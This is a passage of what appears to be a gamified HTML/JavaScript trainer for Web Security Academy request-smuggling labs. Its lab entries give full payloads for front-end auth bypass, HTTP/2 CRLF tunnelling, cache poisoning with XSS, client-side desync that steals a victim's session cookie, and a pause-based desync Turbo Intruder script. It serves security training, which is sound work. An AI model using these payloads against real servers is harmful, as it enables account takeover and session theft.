+{title:'Your smuggled request skips front-end',desc:'Smuggle a GET /admin with X-SSL-CLIENT-CN: administrator. Front-end never sees it — goes straight to back-end. Back-end: "Oh, this is the administrator. Welcome!"',code:`POST /example HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: x-www-form-urlencoded\nContent-Length: 64\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-SSL-CLIENT-CN: administrator\nFoo: x`},
+{title:'Delete carlos',desc:'Once admin access confirmed, change URL to /admin/delete?username=carlos.',code:`POST /example HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: x-www-form-urlencoded\nContent-Length: 80\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-SSL-CLIENT-CN: administrator\nFoo: x`},
+],
+template:`POST /example HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: x-www-form-urlencoded\nContent-Length: 80\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-SSL-CLIENT-CN: administrator\nFoo: x`,
+solution:`POST /example HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: x-www-form-urlencoded\nContent-Length: 80\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nX-SSL-CLIENT-CN: administrator\nFoo: x`,
+hint:'The key header is X-SSL-CLIENT-CN: administrator in your INNER smuggled request. Front-end never sees it — back-end trusts it.',
+validate:r=>{const l=r.toLowerCase();return l.includes('x-ssl-client-cn: administrator')&&l.includes('transfer-encoding: chunked');},
+sim:(r,n)=>r.toLowerCase().includes('x-ssl-client-cn: administrator')?{win:true,body:`HTTP/1.1 200 OK\n\n✅ IDENTITY SPOOFED!\n[Front-end never saw your smuggled request]\n[Back-end received X-SSL-CLIENT-CN: administrator]\n[Back-end: "This must be the administrator — front-end verified it!"]\n\ncarlос DELETED!\n🪪 CLIENT CERTIFICATE AUTH BYPASSED COMPLETELY!`}:{body:`HTTP/1.1 403 Forbidden\n\nAccess denied. Include X-SSL-CLIENT-CN: administrator in your inner smuggled request.`}
+},
+
+{id:'h2_tunnel_bypass',num:'LAB-20',title:'HTTP/2 REQUEST TUNNELLING — BYPASS ACCESS CONTROLS',icon:'🚇',diff:'expert',xp:600,
+objective:'Use request tunnelling to access /admin as administrator when no connection reuse exists.',
+brain:'No shared connection between front/back? Most smuggling fails. But tunnelling works differently: you inject a COMPLETE inner HTTP/1 request inside your HTTP/2 headers using CRLF. The front-end reads just the outer request. The back-end sees the inner one. No shared connection needed!',
+viz:'h2',
+steps:[
+{title:'Request tunnelling vs smuggling',desc:'Smuggling: exploits shared persistent connection. Tunnelling: injects inner request via CRLF in HTTP/2 headers — works even without connection reuse!',note:'Front-end doesn\'t reuse connection? Tunnelling still works because the inner request is INSIDE your outer request headers.'},
+{title:'Leak front-end headers first',desc:'Inject large Content-Length + search= parameter in header name using CRLF. Make body longer than smuggled CL. Response reflects all front-end headers including auth headers!',code:`// In Burp Inspector, header name:\nfoo: bar\\r\\nContent-Length: 500\\r\\n\\r\\nsearch=x\n\n// Value: xyz`},
+{title:'Read the leaked headers',desc:'Response shows: X-SSL-VERIFIED: 0, X-SSL-CLIENT-CN: null, X-FRONTEND-KEY: [your-unique-key]. You need these exact values (but modified) for your exploit.',},
+{title:'Tunnel request to /admin',desc:'Change to HEAD method. Inject complete GET /admin with spoofed auth headers in the header name field.',code:`// Header name:\nfoo: bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nX-SSL-VERIFIED: 1\\r\\nX-SSL-CLIENT-CN: administrator\\r\\nX-FRONTEND-KEY: YOUR-KEY\\r\\n\\r\\n\n// Value: xyz`},
+{title:'Delete carlos',desc:'Once admin confirmed, tunnel GET /admin/delete?username=carlos with same spoofed headers.'},
+],
+template:`HEAD / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nX-SSL-VERIFIED: 1\\r\\nX-SSL-CLIENT-CN: administrator\\r\\nX-FRONTEND-KEY: YOUR-KEY\\r\\n\\r\\n`,
+solution:`HEAD / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\n\\r\\nGET /admin/delete?username=carlos HTTP/1.1\\r\\nX-SSL-VERIFIED: 1\\r\\nX-SSL-CLIENT-CN: administrator\\r\\nX-FRONTEND-KEY: YOUR-KEY\\r\\n\\r\\n`,
+hint:'Use HEAD method. Inject GET /admin inside header NAME (not value) using \\r\\n\\r\\n to terminate first request. Include spoofed X-SSL-VERIFIED: 1 and X-SSL-CLIENT-CN: administrator.',
+validate:r=>{const l=r.toLowerCase();return l.includes('http/2')&&l.includes('\\r\\n\\r\\n')&&l.includes('administrator');},
+sim:(r,n)=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('administrator')?{win:true,body:`HTTP/2 200 OK\n\n✅ REQUEST TUNNELLING SUCCESS!\n[No connection reuse — still works via header injection]\n[Inner GET /admin/delete tunnelled to back-end]\n[X-SSL-CLIENT-CN: administrator accepted]\n\ncarlос DELETED!\n🚇 TUNNELLING BYPASSES EVERYTHING — even no-connection-reuse protection! 💀`}:{body:`HTTP/2 200 OK\n\nUse HEAD method. Inject complete GET /admin inside header name with \\r\\n\\r\\n.`}
+},
+
+{id:'cache_tunnel',num:'LAB-21',title:'WEB CACHE POISONING — HTTP/2 TUNNELLING',icon:'💫',diff:'expert',xp:600,
+objective:'Use HTTP/2 :path pseudo-header injection to tunnel XSS into cached home page.',
+brain:'Inject \\r\\n in the :path pseudo-header to split one request into two at the HTTP/1 level. Tunnel a request to a reflective endpoint with XSS payload. Cache the poisoned response under the home page URL. Every visitor gets XSS!',
+viz:'cache',
+steps:[
+{title:'Inject via :path pseudo-header',desc:'HTTP/2 :path becomes the URL line in HTTP/1 downgrade. Inject \\r\\n followed by complete request headers inside the :path value.',code:`:path value:\n/?cachebuster=1 HTTP/1.1\\r\\nFoo: bar`},
+{title:'Tunnel with HEAD method',desc:'Use HEAD to tunnel a GET /post?postId=1 inside the :path. The tunnelled response gets nested in your main response.',code:`:path value:\n/?cb=2 HTTP/1.1\\r\\nHost: YOUR-LAB-ID\\r\\n\\r\\nGET /post?postId=1 HTTP/1.1\\r\\nFoo: bar`},
+{title:'Find reflective XSS gadget',desc:'/resources triggers redirect to /resources/. Redirect URL includes your requested path. XSS in path → reflected in Location header / redirect.',code:`:path value:\n/?cb=3 HTTP/1.1\\r\\nHost: YOUR-LAB\\r\\n\\r\\nGET /resources?\x3cscript>alert(1)\x3c/script> HTTP/1.1\\r\\nFoo: bar`},
+{title:'Pad to exceed Content-Length',desc:'Tunnelled response must exceed the Content-Length of the outer response. Pad XSS payload with extra characters until it does.',note:'Check normal GET / response Content-Length. Pad your XSS until tunnelled response length > that number.'},
+{title:'Poison the cache',desc:'Remove cachebuster. Send until cache poisoned. Every visitor to / gets alert(1). Victim visits within 15 seconds → lab solved!'},
+],
+template:`:path: /?cachebuster=1 HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net\\r\\n\\r\\nGET /resources?\x3cscript>alert(1)\x3c/script>PADDING_TO_FILL HTTP/1.1\\r\\nFoo: bar\n\n// Full request:\nHEAD / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\n[Set :path in Burp Inspector]`,
+solution:`HEAD / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\n:path: /?cachebuster=X HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net\\r\\n\\r\\nGET /resources?\x3cscript>alert(1)\x3c/script>AAAAAAAAAAAAA HTTP/1.1\\r\\nFoo: bar`,
+hint:':path pseudo-header injection. Use HEAD method. Tunnel GET /resources?\x3cscript>alert(1)\x3c/script>. Pad with A\'s until tunnelled response length > outer Content-Length.',
+validate:r=>{const l=r.toLowerCase();return l.includes('http/2')&&l.includes('\\r\\n')&&l.includes('\x3cscript>');},
+sim:(r,n)=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('\x3cscript>')?{win:true,body:`HTTP/2 200 OK\n\n✅ CACHE POISONED VIA TUNNELLING!\n[:path injection created nested HTTP/1 request]\n[GET /resources?\x3cscript>alert(1)\x3c/script> tunnelled]\n[Redirect response with XSS in Location header cached under /]\n\n[Victim visits home page]\n[Browser follows cached redirect]\n[alert(1) FIRES]\n\n💫 CACHE POISONING + TUNNELLING = DEVASTATING COMBO! ☠️`}:{body:`HTTP/2 200 OK\n\nNeed: HTTP/2 + :path injection with \\r\\n\\r\\n + \x3cscript>alert(1)\x3c/script> in inner request.`}
+},
+
+{id:'client_desync',num:'LAB-22',title:'CLIENT-SIDE DESYNC',icon:'🖥️',diff:'expert',xp:600,
+objective:"Use browser's own fetch() to desync its connection, capturing victim's cookie via comment.",
+brain:'Normal smuggling needs Burp. But CSD uses NORMAL browser fetch() requests! Victim visits your exploit page → their browser sends a fetch() that desyncs ITS OWN connection to the vulnerable site → subsequent browser requests get poisoned → their cookie captured. Attack single-server sites. Attack intranets. Insane power!',
+viz:'csd',
+steps:[
+{title:'Find CL.0 in the browser context',desc:'GET / redirects to /en. Convert to POST, Content-Length: 1, empty body. Server responds instantly → ignoring body → CL.0 vector usable from browser!',note:'Unlike server-side smuggling, this works even if front-end and back-end are the SAME server.'},
+{title:'Confirm with fetch() in browser console',desc:'Test in Chrome DevTools console. CORS error is intentional — use it to chain follow-up request via .catch().',code:`fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n  method: 'POST',\n  body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x',\n  mode: 'cors',\n  credentials: 'include',\n}).catch(() => {\n  fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n    mode: 'no-cors',\n    credentials: 'include'\n  })\n})`},
+{title:'Check Network tab',desc:'You should see: main request (CORS error) + follow-up request (404 response). 404 = desync works in browser! The browser poisoned its own connection.'},
+{title:'Craft the exploit to capture victim cookie',desc:'Smuggle POST /en/post/comment with comment= last and Content-Length: 400. Victim\'s browser request gets captured as a comment.',code:`fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n  method: 'POST',\n  body: 'POST /en/post/comment HTTP/1.1\\r\\nHost: YOUR-LAB-ID\\r\\nCookie: session=YOUR-SESSION\\r\\nContent-Length: 400\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf=TOKEN&postId=5&comment=',\n  mode: 'cors',\n  credentials: 'include',\n}).catch(() => {\n  fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {\n    mode: 'no-cors', credentials: 'include'\n  })\n})`},
+{title:'Deliver to victim and read cookie',desc:'Wrap in \x3cscript> tags → store on exploit server → Deliver to Victim. Check blog comments for victim\'s session cookie. Use it to login.'},
+],
+template:`fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n  method: 'POST',\n  body: 'POST /en/post/comment HTTP/1.1\\r\\nHost: YOUR-LAB-ID.h1-web-security-academy.net\\r\\nCookie: session=YOUR-SESSION; _lab_analytics=YOUR-LAB-COOKIE\\r\\nContent-Length: 400\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf=YOUR-CSRF&postId=5&name=hacker&email=h@h.net&website=https://h.net&comment=',\n  mode: 'cors',\n  credentials: 'include',\n}).catch(() => {\n  fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {\n    mode: 'no-cors',\n    credentials: 'include'\n  })\n})`,
+solution:`fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n  method: 'POST',\n  body: 'POST /en/post/comment HTTP/1.1\\r\\nHost: YOUR-LAB-ID.h1-web-security-academy.net\\r\\nCookie: session=YOUR-SESSION\\r\\nContent-Length: 400\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf=TOKEN&postId=5&name=hacker&email=h@h.net&website=https://h.net&comment=',\n  mode: 'cors',\n  credentials: 'include',\n}).catch(() => {\n  fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {\n    mode: 'no-cors', credentials: 'include'\n  })\n})`,
+hint:'fetch() with mode:cors intentionally triggers CORS error. The .catch() chains the follow-up request on the SAME poisoned connection.',
+validate:r=>{const l=r.toLowerCase();return l.includes('fetch(')&&l.includes('comment=')&&l.includes('credentials: \'include\'');},
+sim:(r,n)=>r.toLowerCase().includes('fetch(')&&r.toLowerCase().includes('comment=')?{win:true,body:`// EXPLOIT DELIVERED TO VICTIM!\n\n[Victim visits your exploit server]\n[Their browser executes fetch() payload]\n[Browser sends POST to target site]\n[Browser's OWN connection gets desynced]\n[Victim's next browser request appended to comment body]\n\n[Blog Comment by "hacker"]:\n"GET /capture-me HTTP/1.1\nHost: YOUR-LAB.h1-web-security-academy.net\nCookie: session=VICTIM_COOKIE_abc123\nUser-Agent: Mozilla/5.0..."\n\n🖥️ CLIENT-SIDE DESYNC COMPLETE!\nVictim's session: session=VICTIM_COOKIE_abc123\nSingle-server attack — NO shared connection needed! ☠️`}:{body:`// Adjust fetch() payload:\n// - POST method with body containing inner HTTP request\n// - mode: 'cors' (intentional CORS error)\n// - credentials: 'include'\n// - .catch() with follow-up no-cors request\n// - comment= must be last parameter`}
+},
+
+{id:'pause_desync',num:'LAB-22b',title:'PAUSE-BASED DESYNC — SERVER SIDE',icon:'⏸️',diff:'expert',xp:600,
+objective:'Use a 61-second pause mid-request to trigger a server-side desync on a seemingly secure server.',
+brain:'Some secure servers only reveal their vulnerability if you PAUSE mid-request. Send headers, promise a body, then wait 61 seconds. The back-end times out waiting and responds early — processing your smuggled prefix before receiving the full body. Security through obscurity — broken by patience!',
+viz:'cl0',
+steps:[
+{title:'Why pause-based?',desc:'Standard timing tests show nothing. The vulnerability only triggers when you pause between headers and body. The back-end has a timeout that fires and processes what it has — including your smuggled prefix.',note:'This requires Turbo Intruder extension. Standard Burp Repeater cannot pause mid-request.'},
+{title:'Find the endpoint',desc:'Apache 2.4.52 is vulnerable on endpoints that trigger server-level redirects. GET /resources → 301. Convert to POST. This is your gadget.',code:`// GET /resources → 301 /resources/\n// This "early response" breaks the deadlock!`},
+{title:'Turbo Intruder script',desc:'Queue the request with pauseMarker after headers. Pause 61 seconds. Then queue a second normal request.',code:`def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                          concurrentConnections=1,\n                          requestsPerConnection=500)\n    engine.queue(target.req,\n                 pauseMarker=['\\r\\n\\r\\n'],\n                 pauseTime=61000)\n    engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)`},
+{title:'Interpret results',desc:'After 61 seconds: two table entries. Entry 1 = normal 301 redirect. Entry 2 = response to GET /admin → confirms the pause-based CL.0 vuln!',note:'If you see admin panel content in entry 2 — you\'re in!'},
+{title:'Delete carlos',desc:'Change inner smuggled request to POST /admin/delete with csrf + username=carlos. Update pauseMarker to only match FIRST \\r\\n\\r\\n.',code:`pauseMarker=['Content-Length: CORRECT\\r\\n\\r\\n']`},
+],
+template:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net`,
+solution:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nPOST /admin/delete/ HTTP/1.1\nHost: localhost\nContent-Type: x-www-form-urlencoded\nContent-Length: CORRECT\n\ncsrf=YOUR-CSRF-TOKEN&username=carlos`,
+hint:'Requires Turbo Intruder with 61-second pause. /resources is the gadget endpoint. Change Host to localhost for admin access.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/resources')&&(l.includes('/admin')||l.includes('carlos'));},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('carlos')||l.includes('/admin/delete'))return{win:true,body:`[Turbo Intruder: sending headers...]\n[PAUSING 61 seconds...]\n[Back-end timeout: sends early 301 response for /resources]\n[Back-end processes buffered smuggled request]\n\nEntry 1: HTTP/1.1 301 /resources/ (normal)\nEntry 2: HTTP/1.1 200 OK (Admin panel content!)\n\n[Sending delete request with pause...]\n[61 seconds later...]\n\n✅ carlos DELETED!\n⏸️ PAUSE-BASED DESYNC — patience is a weapon! ☠️`};return{body:`HTTP/1.1 200 OK\n\nIn real lab: use Turbo Intruder with pauseMarker=['\\r\\n\\r\\n'] and pauseTime=61000.\n/resources as outer POST. /admin as inner request.`};}
+},
+];
+</script>
+<script>
+// ═══════════════════════════════════════════
+// CURRENT LAB STATE
+// ═══════════════════════════════════════════
+let CUR=null,attemptN=0;
+
+// ═══════════════════════════════════════════
+// BUILD DASHBOARD
+// ═══════════════════════════════════════════
+function buildDash(){
+  const gP=document.getElementById('grid-p');
+  const gE=document.getElementById('grid-e');
+  gP.innerHTML='';gE.innerHTML='';
+  LABS.forEach((lab,i)=>{
+    const solved=ST.solved.has(lab.id);
+    const card=document.createElement('div');
+    card.className='mission-card'+(solved?' solved':'');
+    card.innerHTML=`
+      <div class="mc-top">
+        <span class="mc-icon">${lab.icon}</span>
+        <div class="mc-info">
+          <div class="mc-num">${lab.num}</div>
+          <div class="mc-title">${lab.title}</div>
+        </div>
+      </div>
+      <span class="mc-diff ${lab.diff}">${lab.diff.toUpperCase()}</span>
+      <div class="mc-obj">${lab.objective}</div>
+      <div class="mc-footer">
+        <span class="mc-xp">+${lab.xp} XP</span>
+        <span class="mc-status ${solved?'done':'open'}">${solved?'✅ SOLVED':'⬤ OPEN'}</span>
+      </div>
+    `;
+    card.onclick=()=>loadLab(lab.id);
+    if(lab.diff==='expert')gE.appendChild(card);
+    else gP.appendChild(card);
+  });
+}
+
+// ═══════════════════════════════════════════
+// LOAD LAB
+// ═══════════════════════════════════════════
+function loadLab(id){
+  const lab=LABS.find(l=>l.id===id);
+  if(!lab)return;
+  CUR=lab;attemptN=0;
+  renderLab(lab);
+  showP('lab');
+  document.getElementById('tab-lab').textContent='⚡ ACTIVE MISSION';
+  startTimer();
+}
+
+// ═══════════════════════════════════════════
+// VIZ RENDERER
+// ═══════════════════════════════════════════
+function renderViz(type){
+  const flows={
+    cl_te:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode frt"><span class="vi">🛡️</span>FRONT-END<small>(Content-Length)</small></div><div class="varr">──▶</div><div class="vnode bck"><span class="vi">⚙️</span>BACK-END<small>(Transfer-Encoding)</small></div><div class="varr danger">◀POISON▶</div><div class="vnode vic"><span class="vi">😵</span>VICTIM</div>`,
+    te_cl:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode frt"><span class="vi">🛡️</span>FRONT-END<small>(Transfer-Encoding)</small></div><div class="varr">──▶</div><div class="vnode bck"><span class="vi">⚙️</span>BACK-END<small>(Content-Length)</small></div><div class="varr danger">◀POISON▶</div><div class="vnode vic"><span class="vi">😵</span>VICTIM</div>`,
+    te_te:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode frt"><span class="vi">🛡️</span>FRONT-END<small>(TE confused)</small></div><div class="varr">──▶</div><div class="vnode bck"><span class="vi">⚙️</span>BACK-END<small>(TE)</small></div>`,
+    h2:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode frt"><span class="vi">🛡️</span>FRONT-END<small>(HTTP/2)</small></div><div class="varr danger">⬇DOWNGRADE</div><div class="vnode bck"><span class="vi">⚙️</span>BACK-END<small>(HTTP/1)</small></div>`,
+    capture:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode bck"><span class="vi">⚙️</span>BACK-END<small>(buffering)</small></div><div class="varr danger">◀CAPTURED</div><div class="vnode vic"><span class="vi">😵</span>VICTIM<small>(request stolen)</small></div>`,
+    cache:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode cch"><span class="vi">💾</span>CACHE<small>(poisoned)</small></div><div class="varr danger">──▶ALL</div><div class="vnode vic"><span class="vi">😵</span>ALL USERS</div>`,
+    cl0:`<div class="vnode att"><span class="vi">👾</span>ATTACKER</div><div class="varr">──▶</div><div class="vnode frt"><span class="vi">🚫</span>SERVER<small>(ignores body)</small></div><div class="varr danger">🚪SMUGGLED</div><div class="vnode bck"><span class="vi">⚙️</span>UNPROTECTED<small>endpoint</small></div>`,
+    csd:`<div class="vnode att"><span class="vi">👾</span>EXPLOIT<small>server</small></div><div class="varr">──▶</div><div class="vnode vic"><span class="vi">😵</span>VICTIM<small>browser</small></div><div class="varr danger">──▶SELF-POISON</div><div class="vnode bck"><span class="vi">⚙️</span>TARGET<small>site</small></div>`,
+  };
+  return`<div class="viz"><div class="viz-title">// ATTACK FLOW</div><div class="viz-flow">${flows[type]||flows.cl_te}</div></div>`;
+}
+
+// ═══════════════════════════════════════════
+// RENDER LAB
+// ═══════════════════════════════════════════
+function renderLab(lab){
+  const solved=ST.solved.has(lab.id);
+  const best=ST.bestTimes[lab.id];
+  const notes=ST.notes[lab.id]||'';
+  document.getElementById('lab-content').innerHTML=`
+  <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
+    <button class="btn btn-g" onclick="showP('dash')">← OPS CENTER</button>
+    ${solved?`<div style="padding:8px 16px;border:1px solid var(--green);color:var(--green);font-size:10px;letter-spacing:2px;">✅ SOLVED ${best?'// BEST: '+fmtTime(best):''}</div>`:''}
+  </div>
+
+  <div class="lab-banner ${lab.diff==='expert'?'expert-banner':''}">
+    <div class="lab-num">${lab.num} // ${lab.title}</div>
+    <div class="lab-title">${lab.icon} ${lab.title}</div>
+    <div class="lab-badges">
+      <span class="badge badge-${lab.diff==='expert'?'e':'p'}">${lab.diff.toUpperCase()}</span>
+      <span class="badge badge-xp">+${lab.xp} XP</span>
+    </div>
+    <div class="lab-obj">${lab.objective}</div>
+  </div>
+
+  <div class="brain-hack">🧠 <strong>BRAIN HACK:</strong> ${lab.brain}</div>
+
+  ${renderViz(lab.viz)}
+
+  <div class="steps-wrap">
+    <div class="steps-hdr" onclick="toggleSteps(this)">
+      📋 STEP-BY-STEP MISSION GUIDE // CLICK TO EXPAND
+      <span class="stog">▼</span>
+    </div>
+    <div class="steps-body" id="steps-body">
+      ${lab.steps.map((s,i)=>`
+      <div class="step-item">
+        <div class="snum">${i+1}.</div>
+        <div class="scontent">
+          <div class="stitle">${s.title}</div>
+          <div class="sdesc">${s.desc}</div>
+          ${s.code?`<div class="scode">${esc(s.code)}</div>`:''}
+          ${s.note?`<div class="snote">⚠️ ${s.note}</div>`:''}
+        </div>
+      </div>`).join('')}
+    </div>
+  </div>
+
+  <div class="timer-row">
+    ⏱ ELAPSED: <span class="timer-val" id="timer-val">00:00</span>
+    <span style="margin-left:auto;font-size:9px;letter-spacing:2px;">ATTEMPT: <span id="atm-n">0</span></span>
+  </div>
+
+  <div class="editor-grid">
+    <div class="ebox">
+      <div class="ebox-hdr"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span>&nbsp; PAYLOAD EDITOR <span class="kb" style="margin-left:auto;"><kbd>⌘↵</kbd> SEND</span></div>
+      <textarea class="req-ta" id="req-ta" spellcheck="false">${esc(lab.template)}</textarea>
+    </div>
+    <div class="ebox">
+      <div class="ebox-hdr"><span class="dot-g"></span>&nbsp; SERVER RESPONSE</div>
+      <div class="resp-area" id="resp-area">// Awaiting payload...\n\n\n// Build your request and fire.</div>
+    </div>
+  </div>
+
+  <div class="ctrl">
+    <button class="btn btn-g" onclick="send1()">⚡ SEND (1st time)</button>
+    <button class="btn btn-g" onclick="send2()">⚡ SEND AGAIN (2nd time)</button>
+    <button class="btn btn-y" onclick="toggleHint()">💡 HINT</button>
+    <button class="btn btn-c" onclick="resetTpl()">↩ RESET</button>
+    <button class="btn btn-r" onclick="toggleSol()">☠️ SOLUTION</button>
+  </div>
+
+  <div class="hint-box" id="hint-box">
+    <p>💡 <strong style="color:var(--purple)">OPERATIVE INTEL:</strong> ${lab.hint}</p>
+  </div>
+
+  <div style="font-size:9px;color:rgba(0,255,65,.3);letter-spacing:2px;margin-bottom:4px;">☠️ REVEAL SOLUTION (understand it — don't just copy)</div>
+  <div class="sol-box" id="sol-box"><pre>${esc(lab.solution)}</pre>
+    <div style="margin-top:10px;font-family:'Rajdhani',sans-serif;font-size:14px;color:#cc8888;">Copy to editor → send TWICE → check 2nd response for win condition.</div>
+  </div>
+
+  <div style="margin-top:16px;">
+    <div style="font-size:9px;color:rgba(0,255,65,.3);letter-spacing:2px;margin-bottom:6px;">📝 MISSION NOTES (auto-saved)</div>
+    <textarea class="notes-ta" id="notes-ta" placeholder="// Write your notes here..." onchange="saveNote()">${esc(notes)}</textarea>
+  </div>
+
+  ${solved?`<div class="solved-banner">✅ MISSION ACCOMPLISHED — +${lab.xp} XP EARNED // BEST TIME: ${best?fmtTime(best):'--:--'}</div>`:''}
+  `;
+
+  document.getElementById('req-ta').addEventListener('keydown',e=>{
+    if((e.metaKey||e.ctrlKey)&&e.key==='Enter'){e.preventDefault();send1();}
+  });
+}
+
+function toggleSteps(el){
+  const b=document.getElementById('steps-body');
+  b.classList.toggle('open');
+  el.querySelector('.stog').textContent=b.classList.contains('open')?'▲':'▼';
+}
+function toggleHint(){document.getElementById('hint-box').classList.toggle('show');}
+function toggleSol(){document.getElementById('sol-box').classList.toggle('show');}
+function resetTpl(){if(CUR){document.getElementById('req-ta').value=CUR.template;toast('Template restored','inf',2000);}}
+function saveNote(){if(CUR){ST.notes[CUR.id]=document.getElementById('notes-ta').value;saveState();}}
+
+// ═══════════════════════════════════════════
+// SEND SIMULATION
+// ═══════════════════════════════════════════
+function doSend(attempt){
+  if(!CUR)return;
+  const req=document.getElementById('req-ta').value.trim();
+  if(!req){toast('Write a payload first!','err');return;}
+  attemptN++;
+  document.getElementById('atm-n').textContent=attemptN;
+  const resp=document.getElementById('resp-area');
+  resp.innerHTML='<span style="color:var(--green);animation:blink 0.4s step-end infinite;">█ TRANSMITTING...</span>';
+  setTimeout(()=>{
+    const r=CUR.sim(req,attemptN);
+    let html='';
+    r.body.split('\n').forEach(line=>{
+      if(line.startsWith('HTTP/')){
+        const cls=line.includes('400')||line.includes('403')||line.includes('404')?'r400':(line.includes('301')||line.includes('302')?'r301':'r200');
+        html+=`<span class="${cls}">${esc(line)}</span>\n`;
+      } else if(r.win&&(line.includes('✅')||line.includes('🔥')||line.includes('💀')||line.includes('☠️')||line.includes('🎉'))){
+        html+=`<span class="rwin">${esc(line)}</span>\n`;
+      } else if(line.includes('⚠️')||line.includes('[')&&line.includes(']')){
+        html+=`<span class="rwarn">${esc(line)}</span>\n`;
+      } else {html+=esc(line)+'\n';}
+    });
+    resp.innerHTML=html;
+    if(r.win&&!ST.solved.has(CUR.id)){
+      const prevRank=getRank(ST.xp);
+      ST.solved.add(CUR.id);
+      ST.xp+=CUR.xp;
+      const t=stopTimer(CUR.id);
+      saveState();
+      const newRank=getRank(ST.xp);
+      const rankUp=newRank.name!==prevRank.name;
+      updateUI();buildDash();
+      setTimeout(()=>{showSPop(CUR.xp,CUR.title,rankUp,rankUp?newRank.icon+' '+newRank.name:'');renderLab(CUR);},500);
+    } else if(r.win){
+      toast('Already solved! Try a new mission.','inf');
+    } else if(attemptN===1){
+      toast('Payload sent! Send AGAIN to poison next request.','inf',4000);
+    } else if(attemptN>3&&!CUR.validate(req)){
+      toast('Payload looks wrong. Check hint or steps!','warn',4000);
+    }
+  },500+Math.random()*400);
+}
+
+function send1(){doSend(attemptN+1);}
+function send2(){doSend(attemptN+1);}
+
+// ═══════════════════════════════════════════
+// BUILD RANKS PANEL
+// ═══════════════════════════════════════════
+function buildRanks(){
+  const cur=getRank(ST.xp);
+  document.getElementById('rank-list').innerHTML=RANKS.map(r=>`
+    <div class="rank-item ${r.name===cur.name?'current':''}">
+      <span class="rank-icon">${r.icon}</span>
+      <div>
+        <div class="rank-name">${r.name}</div>
+        <div style="font-size:11px;color:rgba(0,255,65,.4);font-family:'Rajdhani',sans-serif;">${r.msg}</div>
+      </div>
+      <span class="rank-xp">${r.xp}+ XP ${r.name===cur.name?'← YOU':''}</span>
+    </div>
+  `).join('');
+}
+
+// ═══════════════════════════════════════════
+// BUILD GLOSSARY
+// ═══════════════════════════════════════════
+const GLOS=[
+  {t:'Content-Length',c:'cyan',d:'Header declaring body size in bytes. Simple. Fakeable. When two servers disagree on this vs Transfer-Encoding — desync happens.'},
+  {t:'Transfer-Encoding: chunked',c:'orange',d:'Body comes in hex-sized chunks. Chunk size 0 = end of body. More complex protocol = more edge cases to exploit.'},
+  {t:'CL.TE',c:'yellow',d:'Front-end reads Content-Length, back-end reads Transfer-Encoding. You lie about byte count — back-end sees leftover bytes as a new request.'},
+  {t:'TE.CL',c:'red',d:'Front-end reads Transfer-Encoding, back-end reads Content-Length. End chunks early — back-end reads fewer bytes, buffers the rest as next request.'},
+  {t:'TE.TE',c:'orange',d:'Both support TE, but you send obfuscated/duplicate TE header. One server ignores it → falls back to CL. Reduces to CL.TE or TE.CL.'},
+  {t:'H2.CL',c:'cyan',d:'HTTP/2 front-end downgrades to HTTP/1. You inject fake content-length: 0 in HTTP/2. Front-end passes it. Back-end thinks body is empty. Your inner request = buffered.'},
